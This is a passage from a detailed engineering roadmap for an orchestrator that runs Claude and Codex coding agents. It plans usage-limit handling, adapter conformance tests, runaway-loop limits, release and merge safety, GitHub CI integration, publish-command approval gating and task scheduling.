**Verified gap:** AgentRegistry.launch checks only budgets (apps/orchestrator/src/services/agents.ts:72-76). capacityBlock is computed only for display in list() (:117) and used for filtering only by Chairman recovery candidates (chairman/chairman.ts:357) and the HomePage (apps/dashboard/src/pages/HomePage.tsx:51). Reasoner.unavailableReason ignores capacity (chairman/reasoner.ts:313-321), and so does AskService.unavailableReason (ask/service.ts:388-395).

**First steps**

1. UsageResetScheduler (new apps/orchestrator/src/usage/reset-scheduler.ts), armed after CapacityStore.record (usage/capacity.ts:54) and in UsageService.recover (usage/service.ts:99). For each WAITING_FOR_USAGE_RESET task whose blocked stage's agent has an exhausted window reading with resetAt, it fires RESUME_TASK via chairman/gateway.ts as initiator 'system' at resetAt + grace. Opt-in via execution.autoResumeOnReset in executionSettingsSchema (packages/shared/src/tools.ts:289), one resume per reset per task, with an alert via services/alerts.ts. Unknown reset times stay manual.
2. Admission: AgentRegistry.launch (apps/orchestrator/src/services/agents.ts:72) throws AgentGuardError(…, 'USAGE_LIMIT') with the reset time when meter.capacityBlock(agentId) returns a fresh block. Reasoner.unavailableReason (chairman/reasoner.ts:313) and AskService.unavailableReason (ask/service.ts:388) also report a capacity block, with tests in apps/orchestrator/test/usage.test.ts.
3. Codex parity, part 1: parse 'try again at/in …' into resetsAt in capacityFromFailure (packages/agent-sdk/src/usage.ts:53), and resolve 'default' to the configured model from $CODEX_HOME/config.toml in codexUsage.resolvedModel (packages/agent-codex/src/index.ts:66), each with fake-codex fixtures. The per-agent maxConcurrentRuns semaphore and chairman.fallbackAgentId follow in a second PR.

**Done when:** With autoResumeOnReset on, a task paused by a fake-claude rejected rate_limit_event carrying resetsAt resumes exactly once after reset + grace (fake clock). The timer survives an orchestrator restart and raises an alert, and a second limit hit waits again without looping. A launch while a fresh exhausted reading exists fails USAGE_LIMIT without spawning a process. The Chairman and Ask show 'unavailable (usage limit, resets at …)' instead of launching. A Codex failure 'try again at 21:00' produces a capacity reading with a non-null resetAt.

**Check before building:** Whether `codex exec --json` emits rate-limit or token_count snapshots with windows and reset times is undocumented. The repo only knows failure text, so confirm with `pnpm verify:agents --run --only codex` once credits return. The Codex 'try again at/in …' message format and the `model` key in $CODEX_HOME/config.toml need a real sample. OpenAI prices for gpt-6-*/gpt-5.6-* models need a dated official source. Whether Codex CLI loads skills from a skills directory needs confirming before adding listSkills. Claude resetsAt is epoch seconds, as already seen in tests/fixtures/claude-2.1.280-usage.jsonl.

### AGT-2 · Adapter safety kit and fail-closed billing checks

**Now** · Effort L · Impact 4/5 · Needs: nothing first

Each agent adapter currently re-implements the security-critical parts (billing guard, MCP isolation, permission mapping), and no shared test checks them. The Claude billing tripwire also silently turns off if the CLI stops reporting where its credentials come from. This adds one conformance test suite every adapter must pass, makes the billing tripwire and Codex run checks fail closed once proven against the real CLIs, and replaces hard-coded 'claude'/'codex' special cases with declared adapter capabilities. It is the prerequisite for safely adding any third agent, and it warns when an installed CLI version drifts outside the tested range.

**Verified gap:** No shared conformance kit exists: packages/agent-sdk/test has only classify.test.ts and skills.test.ts, and each adapter has its own claude.test.ts/codex.test.ts. The tripwire fails open: `if (input.billingMode === 'subscription' && source && source !== 'none') abort(...)` (packages/agent-claude/src/index.ts:480-483), so a missing apiKeySource passes. The only real-CLI fixture (tests/fixtures/claude-2.1.280-usage.jsonl) has no init event at all; apiKeySource appears only in the fake CLI (tests/fixtures/fake-claude.mjs:43,55).

**First steps**

1. Create packages/agent-sdk/test-kit with an exported `adapterConformance({ makeAdapter, fakeCli })` vitest factory covering: prompt never in argv; API-billing health blocks execute; API_BILLING_ENV_VARS stripped (packages/security/src/env-guard.ts:13-43); bridge token absent from argv and temp files; strict MCP; L1 is read-only; USAGE_LIMIT/AUTH_FAILURE/MODEL_UNAVAILABLE classification; usage null never 0. Run it from packages/agent-claude/test and packages/agent-codex/test against tests/fixtures/fake-claude.mjs and fake-codex.mjs.
2. Fail closed with evidence. Make scripts/verify-agents.ts --run report whether the real init event carried apiKeySource. Then change agent-claude/src/index.ts:479-483 to abort in subscription mode when it is missing (fake-claude case with FAKE_CLAUDE_APIKEY_SOURCE unset). Add 'PROTOCOL_DRIFT' to ERROR_CLASSES and have the Codex parser fail an exit-0 run that saw no thread.started or turn.completed (packages/agent-codex/src/index.ts:262-279).
3. Extend AgentCapabilities (packages/shared/src/types.ts:540) with pluginDirs, providerLabel and maxPermissionLevel. Replace learning/service.ts:531 and the dashboard labels (BudgetsTab.tsx:108-109, ProvidersTab.tsx:9) with capability reads. Make runners.launchAgent (runners.ts:531) and chairman candidateContext (chairman.ts:351) refuse a level above maxPermissionLevel. Run the Playwright matrix in both themes.

**Done when:** Both adapters pass the shared kit in `pnpm check`, and a deliberately broken adapter (e.g. prompt in argv) fails it. In subscription mode, a fake Claude init without apiKeySource ends AUTH_FAILURE, enabled only after verify:agents shows the real CLI sends the field. A Codex exit-0 run with no turn events is recorded PROTOCOL_DRIFT, not SUCCESS. No `agentId === 'claude'` branch remains in apps/orchestrator/src. Dashboard provider labels come from /api/agents. An installed CLI version outside agents.compat.json shows an 'unverified' badge on Settings → Agents & Models.

**Check before building:** The real Claude Code 2.1.x stream-json system/init event includes apiKeySource ('none' for claude.ai subscription logins). The repo has no real init sample, so this must be confirmed. Codex `exec --json` always emits thread.started and turn.completed on successful runs. The /skills lookup stays local with no model turn on future Claude versions. GitHub Actions SHA pins need a Dependabot or Renovate update path. Stdio MCP servers using `npx -y pkg@version` must accept pinned specs.

### AGT-3 · Stop runaway runs and ask before overspending

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Today a looping agent can burn most of a 5-hour window before the 30-minute timeout, because nothing counts its turns or repeated tool calls. This adds optional per-stage limits on turns, tool calls and identical repeated calls, plus a loop detector. A run that trips them is stopped with its own error class (RUNAWAY) and handed to the Chairman with the loop evidence instead of being blindly retried. Budgets gain a 'require approval' policy that pauses on the existing approvals gate instead of hard-stopping. Pre-flight estimates and one-click anomaly remedies follow as a second phase, clearly labelled as estimates.

**Verified gap:** No per-run ceiling exists: grep for max-turns/maxTurns/maxToolCalls/RUNAWAY finds nothing in source (the only hit is maxOutputTokens inside tests/fixtures/claude-2.1.280-usage.jsonl). stageDefinitionSchema has only timeoutSec (packages/shared/src/schemas.ts:108) and retry. Claude buildArgs passes no --max-turns (packages/agent-claude/src/index.ts:419-449). abort() is called only by the billing tripwire (index.ts:479-483), and every abort becomes errorClass AUTH_FAILURE (packages/agent-sdk/src/cli-adapter.ts:271-273).

**First steps**

1. Add optional `limits: {maxTurns?, maxToolCalls?, maxIdenticalToolCalls? (default 6)}` to stageDefinitionSchema (packages/shared/src/schemas.ts:98). Pass `--max-turns` in ClaudeCodeAdapter.buildArgs (packages/agent-claude/src/index.ts:~441). Count tool_use blocks (Claude, :500-508) and command_execution items (Codex, packages/agent-codex/src/index.ts:245-252), and hash (tool, normalised input, result) for the loop detector. Extend ParserContext.abort(reason, errorClass?) and parseResult (packages/agent-sdk/src/cli-adapter.ts:27-32, :237-243, :271-273) so a runaway maps to a new 'RUNAWAY' in ERROR_CLASSES (packages/shared/src/constants.ts:76), with fake-claude/fake-codex fixtures that loop.
2. Handle RUNAWAY in engine.handleError (apps/orchestrator/src/engine/engine.ts:1373): never auto-retry, go to supervisor.onError 'exhausted' with loop evidence for CHANGE_EFFORT or replan, emit a learning signal. Add a general per-session call budget to ToolScope, reusing the readOnly.calls pattern at apps/orchestrator/src/tools/service.ts:79-81 and :417-421, that refuses with 'call budget reached; finish with what you have'.
3. Add REQUIRE_APPROVAL to BUDGET_POLICIES (packages/shared/src/usage.ts:56) and 'budget_exceeded' to APPROVAL_KINDS (constants.ts:171). Make BudgetService.blockReason (usage/budgets.ts:242) return the policy, and have runners.launchAgent (engine/runners.ts:524) request an approval via engine/approvals.ts instead of the PERMISSION_DENIED block. Add the dashboard label in the Budgets tab and the approval card.

**Done when:** A fake-claude run that repeats the same tool call with the same result 7 times is stopped within the run, recorded with errorClass RUNAWAY (not AUTH_FAILURE or TIMEOUT), and not blindly retried; the Chairman decision shows the loop evidence. Claude argv contains --max-turns when a stage sets maxTurns. An agent tool session past maxToolCalls gets a DENIED 'call budget reached' result through ToolService.invoke. An exceeded REQUIRE_APPROVAL budget leaves the stage waiting on a pending budget_exceeded approval, and approving it resumes the stage. The Execution tab shows 'turn N/limit'. Tests cover all of this in agent-claude, agent-codex and the orchestrator.

**Check before building:** Claude Code print mode still supports --max-turns. Confirm its exit shape (a result event with subtype like 'error_max_turns' and is_error) on the installed version via verify:agents. Codex exec has no turn-limit flag, so Codex relies on parser counting of turn.completed and command_execution items. Claude rate_limit_event utilisation deltas per run are only available for Claude, so Codex window-share estimates must show Unavailable.

### AGT-4 · Add safe third agents: local model first, then Antigravity and Copilot

**Next** · Effort XL · Impact 4/5 · Needs: AGT-2

With Codex out of credits, every Autopilot task depends on one Claude plan. This adds a 'local' billing kind that Subscription Only accepts only when the model provably runs on this machine (loopback, no proxy), and a local-model agent for light roles such as commit messages, reports and learning reviews. That takes load off the paid plans without ever calling a metered API. Antigravity CLI (the Google AI Pro successor to Gemini CLI) and GitHub Copilot CLI follow as separate, gated milestones. Copilot counts as subscription only when a $0 overage budget is proven.

**Verified gap:** Only two adapters exist (apps/orchestrator/src/app.ts:102-107). Billing cannot express local or credit-capped plans: AgentHealth.billing is 'subscription'|'api'|'unknown' (packages/agent-sdk/src/contract.ts:24, packages/shared/src/types.ts:559), and USAGE_BILLING is ['subscription','api','simulated','unknown'] (packages/shared/src/usage.ts:39). The guard blocks anything but 'subscription' at health (cli-adapter.ts:167-175) and at execute (:197-202). PLAN.md:450-453 and :1905 list Gemini/OpenCode/Ollama/Copilot adapters as Found for Later.

**First steps**

1. Add 'local' to AgentHealth.billing (packages/agent-sdk/src/contract.ts:24), AgentInfo.health.billing (packages/shared/src/types.ts:559) and USAGE_BILLING (packages/shared/src/usage.ts:39). Route the guards at packages/agent-sdk/src/cli-adapter.ts:167 and :197 through one isSubscriptionSafe() allowlist, with tests that 'local' needs a loopback proof, that LAN hosts, hostnames resolving off-loopback and HTTP(S)_PROXY yield 'api', and that 'unknown' stays blocked.
2. Create packages/agent-ollama implementing AgentAdapter directly (loopback HTTP, no tools). It lists models from /api/tags, streams /api/chat, reports token counts as usage lines, and declares repositoryWrite/commandExecution false. Register it in apps/orchestrator/src/app.ts defaultAdapters behind an enable setting. Treat 'local' as $0 in the ledger. Add a fake Ollama HTTP fixture under tests/fixtures and a scripts/verify-agents.ts entry. It must pass I18's conformance kit.
3. Offer it for the reporter, commit-message (source-control/assist.ts) and learning-review roles only, never verdict roles. Only then open the Antigravity milestone (packages/agent-antigravity + fake-agy.mjs + Vertex/ADC vars added to API_BILLING_ENV_VARS in packages/security/src/env-guard.ts, with tests). Copilot comes last, once its budget-read proof is confirmed.

**Done when:** With Ollama on 127.0.0.1, Settings → Agents & Models shows the local agent 'connected · local', and in Subscription Only mode it can run the reporter or commit-message role. Setting OLLAMA_HOST to a LAN address, or setting a proxy variable, shows it blocked. Its runs appear in Usage with billing 'local' and $0 cost. It passes the shared adapter conformance kit. No existing guard test changes meaning. Antigravity and Copilot each land only after their verify:agents tripwires pass on a real CLI.

**Check before building:** Confirmed: Gemini CLI personal-login shutdown on 2026-06-18 with agy as the successor (developers.googleblog.com), and Copilot usage-based AI Credits since 2026-06-01 with $0 additional-spend budgets (github.blog, docs.github.com). Unconfirmed and required before building: agy flags (-p, --output-format stream-json, --model, --effort, --sandbox) and whether an isolated config dir really prevents it starting disabled MCP servers (the cited issue #1088); whether automated agy use on Google AI Pro is within Google's terms; Copilot CLI flags (--output-format json, --additional-mcp-config, --disable-builtin-mcps, --deny-tool, --disable-mcp-server) on the installed version; whether a personal (non …

### AGT-5 · Curated skill sets per role

**Later** · Effort M · Impact 3/5 · Needs: nothing first

Today every Claude run loads about 790 skills, many of them duplicates. That overflows the CLI's skills budget, so agents see bare names without descriptions and start with a heavy context. This lets the operator pick a small, deduplicated skill set per role (planner, fixer, reviewer). The chosen roles then run with only that set, packaged as a Control Center-managed plugin, without touching the operator's own Claude setup. Each run records which skills were actually used, so the Learning page can show which skills help and propose changes.

**Verified gap:** Gap confirmed. stageDefinitionSchema has no skills field (packages/shared/src/schemas.ts:98-130). loadUserConfig is a per-agent switch that defaults to true (schemas.ts:392-397), not a per-stage one. The only managed plugin dirs are acc-learned and acc-repo (apps/orchestrator/src/learning/skills.ts:18-19), passed per run through context.pluginDirs → runners.ts:575 → agent-claude --plugin-dir (packages/agent-claude/src/index.ts:448-449). Isolation is only `--setting-sources project,local` (:443).

**First steps**

1. Measure first. Extend scripts/verify-agents.ts --skills to report, for normal mode, isolated mode and isolated mode with one managed plugin dir: the skill count from the init event, duplicates by content hash, and whether the budget warning appears. Record the findings in docs/systems/agents.md.
2. Add an optional `skillSets` record keyed by role to settingsSchema (packages/shared/src/schemas.ts:506). ManagedSkills (apps/orchestrator/src/learning/skills.ts) gets a builder for an `acc-stage-<role>` plugin using the existing copy rules and a hash dedupe. runners.ts:575 appends it to pluginDirs and sets loadUserConfig false only for roles with a set. Add a Settings → Agents picker fed by SkillCatalog that shows what isolation excludes.
3. Add a structured skill-use field to the agent run result (packages/agent-sdk/src/contract.ts), filled from Skill tool_use blocks at packages/agent-claude/src/index.ts:502. Add migration 20 with a `skill_uses` table (execution_id, skill, stage outcome) and a per-skill use and pass-rate row on the Learning page.

**Done when:** With a reviewer skill set of 5 skills configured, a live review run's init line reports only project skills, acc-learned/acc-repo and those 5, with no budget warning. Roles without a set still load the full user configuration as before. After a few tasks, the Learning page lists each used skill with its use count and stage pass rate, taken from skill_uses rows.

**Check before building:** 1. Confirm exactly what `--setting-sources project,local` excludes on the current Claude Code version: user skills in ~/.claude/skills, plugins enabled in user settings, and user CLAUDE.md memory (agent-skills.md:249-251 says memory may still leak). 2. Confirm whether a `--settings` JSON overlay such as enabledPlugins:{name:false} can narrow plugins without full isolation. That would keep user hooks, and the adapter already passes --settings for hooks (index.ts:378). 3. Find the size of Claude Code's skills-listing budget, whether descriptions return once under it, and whether the 'Exceeded skills context budget' warning appears in the stream-json output so a run can detect it. 4.

## DLV — Delivery and release

### DLV-1 · Release safety net: check before asking, smoke after, one-step rollback

**Next** · Effort L · Impact 4/5 · Needs: nothing first

The Release stage runs the same read-only checks the Release button already runs before it asks for approval, so the operator is never asked to approve something that will then be refused. A target branch that moved is updated and re-tested first. The approval card shows what kind of change is shipping (source, tests, config, lockfile, CI or migration-adjacent files). After going live, an optional smoke check opens the live pages, and an optional Sentry or Worker-log comparison flags new errors. The previous deployment is recorded, so the operator, and only the operator, can roll back in one step with a typed approval.

**Verified gap:** The gap is real. For a release stage, stageGate asks the Level 5 typed approval straight from describe() with no read-only check (apps/orchestrator/src/engine/engine.ts:1030-1035). Only the button path runs precheck() first (apps/orchestrator/src/release/service.ts:602-619, precheck at :654-670). describe() shows commit, target and proof, but no change profile (service.ts:195-211). prove() declares Live when the proofs pass and the site answers below 500 (service.ts:361-362, upCheck :421-425). Nothing watches errors afterwards: a grep for sentry finds only env-guard.

**First steps**

1. In apps/orchestrator/src/engine/engine.ts, before stageGate for release stages, await a now-public release.precheck(). On 'moved', run updateFromTarget and goto tests, as runners.ts:1353-1366 does. If there is no tested tree, fail the stage without asking. In release/service.ts describe(), add a change profile from changedPaths(remote, sha) using classifyDiffPath (packages/git/src/diff-pack.ts).
2. Deployment checkpoints and Pages rollback: at release step 3, record a 'deployment' checkpoint from evidence.before. Add a cloudflare.pages_rollback op in packages/tools/src/packs/cloudflare-api.ts (Level 5 production). Add an operator-only POST /api/tasks/:id/release/rollback in apps/orchestrator/src/http/routes.ts and a Roll back action with typed confirmation in apps/dashboard/src/pages/task/ReleaseCard.tsx. Add tests that agent and Chairman paths cannot reach it.
3. Add proof.smoke {paths} to releaseConfigSchema. After allOk, run verify.web (Level 1) against liveUrl. Screenshots and console errors become release evidence, and a failure adds a limitation and offers Roll back. The Sentry pack and the error-window comparison come as a follow-up.

**Done when:** A Release stage whose target moved updates and re-tests without first showing an approval card. A stage with no tested tree fails without asking. The approval card lists file-type counts and flags lockfile, CI and migration-adjacent paths. After a Live Pages release, Roll back re-points production to the recorded previous deployment and pages_status proves it. Tests show the rollback cannot be triggered by agent tool calls, the Chairman gateway or ROLLBACK_CHECKPOINT. A failing post-release smoke shows its evidence and a Roll back offer on the Release card.

**Check before building:** Confirm before building: the Cloudflare Pages rollback REST endpoint (POST /accounts/{id}/pages/projects/{name}/deployments/{id}/rollback) works only to an earlier successful production deployment and needs a token with Pages edit. `wrangler rollback [version-id] --message` refuses some rollbacks (Durable Object migrations, changed bindings). The Sentry API needs an auth token with event:read and project:read, the org slug and the region host (us or de). The release-health endpoints and the query limits of the Workers Observability API that logs_query uses also need checking.

### DLV-2 · Landing task work: merge-back, fresh bases and early 'target moved' warnings

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Adds a safe 'Merge into &lt;branch>' action to Source Control for finished isolated tasks. It fast-forwards only, refuses when the checkout is dirty, diverged or another task depends on the branch, and cleans up the task branch afterwards. Cancelled work kept in backup refs can be restored or pruned. New isolated tasks start from the freshly fetched target branch when that is safe, and a running task gets an early warning when the target branch moves over files it changed, instead of finding out only at Release. An opt-in mode lets the fixer resolve merge conflicts in the task's own worktree, followed by full re-testing and a fresh approval.

**Verified gap:** The gap is real. GIT_OPERATION_KINDS has no merge (packages/shared/src/source-control.ts:162). finalizeWorktree tells the operator to 'merge it from Source Control' (apps/orchestrator/src/engine/tooling.ts:501), but Source Control never merges: sync stops on divergence and the docs say it 'never merge or rebase' (docs/systems/source-control.md:101-104). refs/acc/worktree-backup/&lt;task> is written at tooling.ts:494, but nothing restores or prunes it outside tests (apps/orchestrator/test/multi-repo.test.ts:288).

**First steps**

1. Add merge_task to GIT_OPERATION_KINDS (packages/shared/src/source-control.ts:162) and SourceControlService.mergeTask through mutate(): ff-only via fastForward, check branchBlocker, then deleteBranchIfAt. Add a route in apps/orchestrator/src/http/source-control-routes.ts, a Merge action on the task page, and the corrected WORKTREE_REMOVED message (tooling.ts:501). Add tests in apps/orchestrator/test/source-control.test.ts.
2. Add a `base` parameter to addWorktree (packages/git/src/worktrees.ts:14) and an unattended option to fetchBranch. In createWorktree and addWorkspaceWorktree (tooling.ts:404, :422), fetch the release target (or the baseline branch's upstream) and base on it when local HEAD is an ancestor. Emit an event, add a per-repository opt-out, and fall back to HEAD when the fetch fails.
3. After syncAll (repository-automation.ts:187), compute changedPaths(baseline, remote target) intersected with each unfinished isolated task's changed files, and publish GIT_TARGET_MOVED with the overlap. release.onConflict 'fixer' comes as a later slice built on updateFromTarget (service.ts:519).

**Done when:** A completed isolated task's branch can be fast-forwarded into its baseline branch from the dashboard and its branch is then deleted. The merge is refused with a clear reason when the checkout is dirty, diverged or another unfinished task is based on it. A new task in a repository whose origin/main is ahead of local main starts from origin/main, the timeline says so, and its release is not refused as 'moved'. When origin/main moves over files a running task changed, the timeline shows the overlap before Review. With onConflict 'fixer', a conflicting update goes to a fix stage and asks for a typed approval again only after tests pass and no conflict markers or unmerged paths remain.

**Check before building:** Git behaviour only: `git worktree add -b <branch> <dir> <refs/remotes/...>`, `merge --ff-only` refusing untracked-file overwrites, and credential prompts suppressed by GIT_TERMINAL_PROMPT=0 and GCM_INTERACTIVE=never on Windows. No third-party service.

### DLV-3 · Remote CI feedback and pull-request releases (GitHub)

**Next** · Effort XL · Impact 4/5 · Needs: nothing first

Adds an opt-in CI stage. It pushes the task branch after review, waits for GitHub Actions on that exact commit, and on failure hands the failed step names and log tails to the fixer, like a failed local test. Adds a 'pull request' release method for repositories whose main branch is protected. It opens a PR, waits for its checks and reviews, merges only at the tested head commit after a typed approval, and proves the merge commit is live. Today these repositories cannot be released at all, and remote CI (other operating systems, secret-backed jobs) never gates what ships.

**Verified gap:** The gap is real. releaseConfigSchema only allows 'none' and 'push' (packages/shared/src/schemas.ts:252-270), and ReleaseService.config() only returns push configs (apps/orchestrator/src/release/service.ts:178-180). The gh pack has pr_list, pr_view, pr_checks, issue_list, issue_view, run_list, pr_create (Level 3), issue_create, issue_comment and secret_put (packages/tools/src/packs/github.ts:74-160).

**First steps**

1. Update the GitHub packs. packages/tools/src/packs/github-api.ts: github.runs gains a `commit` (head_sha) filter. packages/tools/src/packs/github.ts: add github.pr_diff (Level 1), github.pr_review_threads (Level 1, gh api graphql) and github.run_rerun {runId, failedOnly} (Level 3). Keep the write ops out of the agent profiles in packages/tools/src/profiles.ts. Add tests in packages/tools/test/packs.test.ts.
2. Add an opt-in `ci` stage kind (constants.ts STAGE_KINDS, schemas.ts) and runCi in apps/orchestrator/src/engine/runners.ts next to runGit (:1374). It pushes the task branch with pushRef in localBranch mode after scanOutgoing, refuses when CI config changed, polls github.runs by sha through ToolService, writes test_runs with the failed steps, and returns tests_failed. engine/context.ts testResults includes the CI log tails.
3. Add a `pull_request` releaseConfigSchema variant and its branch in release/service.ts run()/prove(): push the branch, pr_create, poll pr_checks and pr_view, then call a new github.pr_merge (Level 5 typed, --match-head-commit, no --admin). Check that the merge tree equals the tested tree and prove Live on the merge sha. Add awaiting_review and checks_running states to ReleaseState and show them in apps/dashboard/src/pages/task/ReleaseCard.tsx.

**Done when:** The following hold against a stand-in GitHub API in tests. A task whose Actions job fails on the pushed sha routes to the fix stage with the failed step and log tail in its prompt context, then re-pushes and passes. A task that changed .github/workflows is not pushed without approval. A repository with protected main releases through a PR that merges only at the tested head, records the PR number, URL and checks in TaskRelease.evidence, and reaches Live on the merge commit. Pending required reviews leave the release unconfirmed, never merged. Policy tests show agent-origin calls to github.pr_merge and workflow dispatch are denied.

**Check before building:** Confirm before building: `gh pr merge --match-head-commit <sha>` exists in the installed gh version. The REST parameter `head_sha` on GET /repos/{o}/{r}/actions/runs works. The GraphQL PullRequest.reviewThreads field (isResolved, comments) is readable by both the gh login and a fine-grained token with pull-requests:read. `gh run rerun --failed` works, and `gh workflow run` accepts -f inputs. Merge methods allowed per repository (allow_merge_commit may be off) and branch-protection rules (required reviews, 'require branches up to date', merge queue) change whether merge can succeed. Push-triggered workflows get repository secrets on same-repo branches.

### DLV-4 · More ways to go live, with the publish side door closed

**Later** · Effort XL · Impact 4/5 · Needs: nothing first

First, every registry and store publish command (npm, PyPI, crates, gems, NuGet, containers, GitHub releases, Gradle and fastlane publishing) becomes a production-level action. It then always needs the operator's typed approval, and agents can never run it, through the tool layer or through the agent's own shell. Next, releases gain pluggable proofs and a Cloudflare Worker direct-deploy method that ships exactly the tested commit and proves the new version is active. After that come Actions-deploy proofs and approval-gated database migrations before release. Registry and store publishing with artifact previews comes last.

**Verified gap:** The gap is real. Release methods are only none and push, and the proofs are hard-coded to cloudflarePages and versionUrl (packages/shared/src/schemas.ts:252-270; apps/orchestrator/src/release/service.ts:376-419 gather()). Classifier gaps (packages/security/src/commands.ts): `gh (pr|release|issue) create` is Level 3 (:116), npm/pnpm/yarn publish is Level 4 (:117) and docker push/login is Level 4 (:123). A grep for twine, poetry, uv publish, cargo, gem push, nuget, podman, gradle and fastlane finds no rule, so they fall to the default Level 2 (classifyCommand, :248).

**First steps**

1. Harden publishing. Add Level 5 production PATTERNS in packages/security/src/commands.ts for npm/pnpm/yarn publish, twine/uv/poetry/cargo publish, gem push, dotnet nuget push, docker/podman push, gh release create, gradle publish*/publishBundle/publishApk and fastlane supply/pilot/deliver. Give android.gradle a classify() that raises publish tasks to Level 5 (packages/tools/src/packs/android.ts). Add the same prefixes to ALWAYS_DENIED in packages/agent-claude/src/index.ts. Add tests in packages/security/test/classifier-v2.test.ts and packages/tools/test/packs.test.ts.
2. Extract gather() and checkSetup() into a ProofProvider registry in apps/orchestrator/src/release/proofs.ts, keeping pages and versionUrl. Add a githubActions proof using github.runs with a commit filter (shared with I29). Add a commitHash input to cloudflare.pages_deploy.
3. Add a `cloudflare_worker` release method in the releaseConfigSchema variant and service.ts. It builds in a detached worktree at the tested sha (addDetachedWorktree + prepareDetached), calls cloudflare.deploy production through ToolService after the typed approval with --message &lt;sha>, and proves Live when the returned versionId is the active deployment. Show the method in ReleasePanel.tsx and ReleaseCard.tsx.

**Done when:** Classifier and policy tests show each publish spelling classified as Level 5 production, denied to agent origin through shell.run, and present in the native Claude deny list at every level. android.gradle publishBundle asks for a typed approval. A Worker repository configured with cloudflare_worker releases its exact tested tree and reaches Live only when Cloudflare reports that version as active. A pre-release D1 migration runs only after its own typed approval and a d1_export backup.

**Check before building:** Confirm before building: `wrangler deploy --message` and `wrangler versions upload --message/--tag` behaviour, and reading the active deployment's version via the Cloudflare API or `wrangler deployments status`. `wrangler pages deploy --commit-hash`, plus the fact that Pages direct upload and Git-connected builds conflict on the same project. `npm view <pkg>@<ver> gitHead` is only set when publishing from a clean git checkout. npm 2FA OTP prompts break unattended publishing, so prefer trusted-publishing workflows with provenance. PyPI's JSON API exposes sha256 digests. GHCR registry API tokens need the packages scope.

### DLV-5 · Finish multi-repository tasks: attribution, draft edits, ordered release

**Later** · Effort L · Impact 3/5 · Needs: DLV-1, DLV-2

Tasks that span several repositories now run, but their usage, budgets and lessons count only the first repository, and they cannot be released. This fixes attribution: each linked repository's usage view and budget see the task as an allocation, and lessons go to the repository whose files they concern. It also lets the operator add or remove linked repositories on a draft. Then it adds an ordered release: check every repository first, ask once with the exact commits, push one repository at a time, prove each Live before the next, and stop and report clearly on the first failure. A separate fix makes MCP servers use repository-scoped credentials for every task.

**Verified gap:**

Every cited gap is real:
- release/service.ts:189 returns 'A task across several repositories is not released this way; release each repository yourself'.
- runners.ts:578 sets `projectId: task.repositoryId`.
- learning/service.ts:158 calls `queueReview(taskId, task.repositoryId)`, and `liveFor(task.repositoryId, …)` (about :214) loads only the primary repository's lessons.
- tools/mcp.ts:52 has `config(s, repositoryId = null)`, called without a repository at :106 (check) and :134 (callTool).

**First steps**

1. Standalone MCP fix. Carry the call scope's repository into OperationContext or the credential host in apps/orchestrator/src/tools/service.ts, and use it in tools/mcp.ts:106/134 so per-repository MCP credentials resolve, with a test in apps/orchestrator/test/tools.test.ts.
2. Attribution without touching the ledger. In usage/queries.ts and usage/budgets.ts forTask, include tasks linked through task_linked_repositories, labelled 'shared with N repositories'. In learning/service.ts, load liveFor() for every linked repository and scope each finding to the repository whose folder prefix its evidence files fall under.
3. Draft edits. Add linkedRepositoryIds to updateTaskSchema with the createTaskSchema checks, and handle it in engine.updateDraft (engine.ts:328) by rewriting task_linked_repositories. Extend remote/guards.ts to deny it on task.update. The ordered release follows later, after I32's ordered 'Merge all' and I31's per-repository checkpoints: per-repository release records (migration 20+), a combined precheck, one Level 5 card, and sequential push-then-prove.

**Done when:** A two-repository test task shows its usage under both repositories' usage views as an allocation, and a PROJECT budget on the linked repository counts it. A lesson whose evidence is in the linked repository is stored for that repository. An MCP server whose credential is mapped to one repository receives it when called from that repository's task. A draft's linked repositories can be changed locally, and the same PATCH from the cloud is refused. Later, releasing a two-repository task shows one approval listing both shas. It pushes and proves repository A before B. When B's precheck fails, nothing is pushed. When B fails after A is live, the record states 'A live, B not released'.

**Check before building:** Mostly none, since this is internal. Confirm that each linked repository's release config (remote, branch, liveUrl and proof such as Cloudflare Pages) can be proved Live independently and in sequence. Pages build latency can be minutes per repository, which sets how long an ordered release holds the approval.

## INT — Intake, integrations and automation

### INT-1 · Start later, priorities, reusable task recipes and capped automations

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Adds three things. Tasks can be scheduled to start later and given a priority. Task recipes are reusable, parameterised task templates (dependency upgrade, fix flaky test, docs drift). A small automation engine can, on a schedule or on an event, create a draft from a recipe or send a notice. Nothing an automation does can approve, release or change settings. Every firing is capped, deduplicated, skipped when the subscription is out of capacity, and audited, so recurring maintenance stops being retyped without risking runaway quota use.

**Verified gap:** TaskEngine.schedule() launches QUEUED tasks in seq order only (apps/orchestrator/src/engine/engine.ts:803-830, sort at :813), with no priority or start-after. createTaskSchema (packages/shared/src/schemas.ts:302-321) has no startAfter, priority or recipe fields. A grep for cron|recipe in apps/orchestrator/src and packages/shared/src finds nothing. The only timers are the Chairman watchdog (chairman/watchdog.ts:44), the WebSocket heartbeat (http/ws.ts:78), remote heartbeat and uploads (remote/service.ts:555-559), terminal grants, and RepositoryAutomation (repository-automation.ts:210).

**First steps**

1. Add an append-only migration adding tasks.start_after and tasks.priority, and optional startAfter/priority in createTaskSchema (schemas.ts:302). engine.ts schedule() (:813) orders by priority desc then seq, skips tasks whose startAfter is in the future with a 'Starts at …' queued blocker, and arms one unref'd timer for the earliest startAfter. Add 'Start later' and a priority control on apps/dashboard/src/pages/NewTaskPage.tsx.
2. Add a recipe schema in packages/shared, built-in recipes/*.yaml loaded like WorkflowService.loadBuiltins (services/workflows.ts:35), custom recipes in a task_recipes table, and a pure instantiateRecipe(recipe, params) that fences and caps params and clamps autoApprove to the ceiling. Add tasks.recipe_id/recipe_version, 'Start from recipe' and 'Save as recipe' in NewTaskPage.
3. Add apps/orchestrator/src/services/automations.ts with automations and automation_runs tables. Schedule and event triggers (bus subscribe) do only 'create DRAFT from recipe', with daily caps, per-subject dedupe, a skip while capacityBlock is set, and a task event plus audit row per firing. Remote access is list, disable and history only, enforced in remote/guards.ts.

**Done when:** A task created with startAfter stays QUEUED showing 'Starts at &lt;time>' and launches within a minute of that time, even if no other task event occurs. Among queued tasks for one repository, the higher priority launches first. A weekly 'dependency-upgrade' automation creates exactly one DRAFT per firing: none while the agent is capacity-blocked, none beyond the daily cap, at most one after the machine wakes from sleep. Each firing has an automation_runs row and a task event. A remote request to create or enable an automation is refused, and no automation action can approve, release or change settings (asserted by tests).

